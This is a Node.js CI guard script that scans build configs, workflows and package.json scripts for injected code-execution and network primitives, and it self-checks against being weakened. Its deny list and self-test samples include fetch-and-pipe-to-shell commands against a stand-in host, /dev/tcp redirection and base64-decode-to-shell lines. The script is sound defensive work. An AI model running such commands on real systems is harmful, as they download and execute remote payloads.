#!/usr/bin/env node
// The surfaces below are loaded and executed with the deploy container's
// production environment, so they must stay declarative or must not gain the
// primitives an injected payload needs. A fork merge once appended a
// wallet-drainer payload to packages/ui/postcss.config.mjs (executed by
// `next build` in the Vercel container, which holds production env), so this
// scan fails the build when a covered surface gains module-scope code
// execution, network/process primitives, or a shell exfiltration command.
//
// Covered surfaces:
//   - build configs (PostCSS, Next.js, Tailwind, ESLint, Drizzle, Trigger)
//   - GitHub Actions workflows (.github/workflows/**), whose steps run in CI
//     and, for the deploy workflow, with the production Trigger.dev credentials
//   - package.json `scripts` blocks, whose lifecycle hooks run in CI and in the
//     Vercel build container
//
// The scan also self-checks that its own primitive list, file patterns and
// detection path were not silently narrowed: this file is the last control
// before an unreviewed merge reaches those deploy credentials, so a change that
// weakens it must not pass the scan it has just neutered. Self-checks catch a
// one-pass weakening; keeping the guard safe to change at all relies on
// review of /scripts/ and /.github/ (see .github/CODEOWNERS).
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'

const CONFIG_PATTERNS = [
  /(^|\/)postcss\.config\.(js|mjs|cjs|ts)$/,
  /(^|\/)next\.config\.(js|mjs|cjs|ts)$/,
  /(^|\/)tailwind\.config\.(js|mjs|cjs|ts)$/,
  /(^|\/)eslint\.config\.(js|mjs|cjs|ts)$/,
  /(^|\/)drizzle\.config\.ts$/,
  /(^|\/)trigger\.config\.ts$/,
]

const WORKFLOW_PATTERNS = [/(^|\/)\.github\/workflows\/.*\.ya?ml$/]

const MANIFEST_PATTERN = /(^|\/)package\.json$/

const FORBIDDEN = [
  { re: /\bcreateRequire\b/, why: 'createRequire' },
  { re: /\brequire\s*\(/, why: 'require()' },
  { re: /\bchild_process\b/, why: 'child_process' },
  { re: /\b(exec|execSync|spawn|spawnSync|fork)\s*\(/, why: 'process execution' },
  { re: /\beval\s*\(/, why: 'eval()' },
  { re: /\bnew\s+Function\b/, why: 'new Function' },
  { re: /node:(http|https|net|tls|dns|dgram)\b/, why: 'raw network module' },
  { re: /\bhttps?\.(request|get)\s*\(/, why: 'raw http request' },
  { re: /\bfetch\s*\(/, why: 'fetch()' },
  { re: /\bXMLHttpRequest\b/, why: 'XMLHttpRequest' },
  // Shell primitives an injected workflow step or lifecycle script would use to
  // pull or push a payload. Absent from every covered surface on a clean tree.
  { re: /\b(curl|wget)\b/, why: 'network download command' },
  { re: /\/dev\/tcp\//, why: 'raw TCP redirection' },
  { re: /\|\s*(sudo\s+)?(ba|z|k)?sh\b/, why: 'pipe to shell' },
  { re: /\bbase64\s+(--decode|-d)\b/, why: 'base64 decode' },
]

// Detection path, kept as a pure function so the self-check below can exercise
// it end to end on known-injected and known-clean samples.
function findViolations(text) {
  const found = []
  text.split('\n').forEach((line, i) => {
    for (const { re, why } of FORBIDDEN) {
      if (re.test(line)) found.push({ line: i + 1, why, text: line.trim() })
    }
  })
  return found
}

// Resolve the repository root and list tracked files from there, so the scan
// covers every workspace config no matter which package directory invokes it.
// Vercel runs this from apps/web and apps/admin during their production builds,
// and the configs that must be checked (including packages/ui/postcss.config.mjs)
// live outside those directories.
const repoRoot = execFileSync('git', ['rev-parse', '--show-toplevel'], {
  encoding: 'utf8',
}).trim()

const tracked = execFileSync('git', ['ls-files'], { cwd: repoRoot, encoding: 'utf8' })
  .split('\n')
  .filter(Boolean)

const configFiles = tracked.filter((f) => CONFIG_PATTERNS.some((re) => re.test(f)))
const workflowFiles = tracked.filter((f) => WORKFLOW_PATTERNS.some((re) => re.test(f)))
const manifestFiles = tracked.filter((f) => MANIFEST_PATTERN.test(f))

const violations = []

for (const file of [...configFiles, ...workflowFiles]) {
  const text = readFileSync(resolve(repoRoot, file), 'utf8')
  for (const { line, why, text: src } of findViolations(text)) {
    violations.push(`${file}:${line}: ${why}: ${src}`)
  }
}

for (const file of manifestFiles) {
  let manifest
  try {
    manifest = JSON.parse(readFileSync(resolve(repoRoot, file), 'utf8'))
  } catch (err) {
    violations.push(`${file}: not valid JSON (${err.message})`)
    continue
  }
  for (const [name, command] of Object.entries(manifest.scripts ?? {})) {
    if (typeof command !== 'string') continue
    for (const { why } of findViolations(command)) {
      violations.push(`${file}: scripts.${name}: ${why}: ${command}`)
    }
  }
}

// Self-check. The samples below verify each required primitive, each file
// pattern and the detection path, so a change that drops one is reported
// instead of quietly passing. The guard's own text is never scanned against
// FORBIDDEN, so these samples do not flag it.
const REQUIRED_CONFIGS = [
  'postcss.config.mjs',
  'next.config.ts',
  'tailwind.config.ts',
  'eslint.config.mjs',
  'drizzle.config.ts',
  'trigger.config.ts',
]

const REQUIRED_PRIMITIVES = [
  { why: 'createRequire', sample: "import { createRequire } from 'node:module'" },
  { why: 'require()', sample: "const m = require('node:fs')" },
  { why: 'child_process', sample: "from 'node:child_process'" },
  { why: 'process execution', sample: "spawnSync('sh', ['-c', 'id'])" },
  { why: 'eval()', sample: 'eval(payload)' },
  { why: 'new Function', sample: "new Function('return 1')" },
  { why: 'raw network module', sample: "require('node:http')" },
  { why: 'raw http request', sample: 'https.request(options)' },
  { why: 'fetch()', sample: "fetch('http://example.test')" },
  { why: 'XMLHttpRequest', sample: 'new XMLHttpRequest()' },
  { why: 'network download command', sample: 'curl http://example.test/x' },
  { why: 'raw TCP redirection', sample: 'cat < /dev/tcp/10.0.0.1/80' },
  { why: 'pipe to shell', sample: 'curl http://example.test/x | sh' },
  { why: 'base64 decode', sample: 'echo aGk= | base64 -d | sh' },
]

const INJECTED_SAMPLE = 'curl -fsSL http://example.test/payload.sh | sh'
const CLEAN_SAMPLE = 'const answer = 42 // nothing to see here'

const tampered = []
for (const name of REQUIRED_CONFIGS) {
  if (!CONFIG_PATTERNS.some((re) => re.test(name))) {
    tampered.push(`build config pattern for ${name} was removed`)
  }
}
if (!WORKFLOW_PATTERNS.some((re) => re.test('.github/workflows/ci.yml'))) {
  tampered.push('workflow pattern was removed')
}
if (!MANIFEST_PATTERN.test('package.json')) {
  tampered.push('package.json manifest pattern was removed')
}
for (const { why, sample } of REQUIRED_PRIMITIVES) {
  const entry = FORBIDDEN.find((f) => f.why === why)
  if (!entry) tampered.push(`forbidden primitive "${why}" was removed`)
  else if (!entry.re.test(sample)) tampered.push(`forbidden primitive "${why}" no longer detects its pattern`)
}
if (findViolations(INJECTED_SAMPLE).length === 0) {
  tampered.push('the detection path no longer flags a known-injected sample')
}
if (findViolations(CLEAN_SAMPLE).length > 0) {
  tampered.push('the detection path now flags a known-clean sample')
}
if (configFiles.length === 0) tampered.push('no build config files were enumerated')
if (workflowFiles.length === 0) tampered.push('no workflow files were enumerated')
if (manifestFiles.length === 0) tampered.push('no package.json files were enumerated')

if (tampered.length > 0) {
  console.error('check-build-configs.mjs self-check failed; the guard has been narrowed:')
  for (const t of tampered) console.error(`  ${t}`)
  console.error('Restore the guard; a change that weakens it must not pass its own scan.')
  process.exit(1)
}

if (violations.length > 0) {
  console.error('Build, workflow and package-script surfaces contain module-scope code execution or network/process primitives:')
  for (const v of violations) console.error(`  ${v}`)
  console.error('These surfaces must stay declarative; remove the offending code.')
  process.exit(1)
}

console.log(
  `Checked ${configFiles.length} build config file(s), ${workflowFiles.length} workflow file(s) and ${manifestFiles.length} package manifest(s); no injected primitives found.`,
)
